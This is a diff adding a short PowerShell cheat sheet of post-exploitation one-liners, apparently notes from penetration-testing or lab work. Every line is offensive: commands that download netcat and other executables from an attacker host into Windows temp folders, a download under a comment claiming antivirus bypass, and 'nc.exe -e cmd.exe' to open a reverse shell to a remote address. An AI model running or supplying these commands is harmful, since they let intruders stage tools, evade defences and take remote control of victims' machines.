@@ -1,0 +1,15 @@
+powershell
+----------
+
+# Run inside the reverse shell: 
+powershell -c '(new-object System.Net.WebClient).DownloadFile("http://IP/nc.exe", "C:\Windows\Temp\nc.exe")'
+# OR
+powershell -c 'Invoke-WebRequest "http://IP/nc.exe" -OutFile "C:\Windows\Temp\nc.exe"' 
+
+
+#powershell bypass antvirus
+powershell wget "http://x.x.x.x/nc64.exe" -outfile "nc64.exe"
+nc.exe -e cmd.exe x.x.x.x 1234
+
+#Download shell
+powershell "(new-object System.Net.WebClient).Downloadfile('http://10.10.14.19:80/dev4444.exe', 'dev4444.exe')"
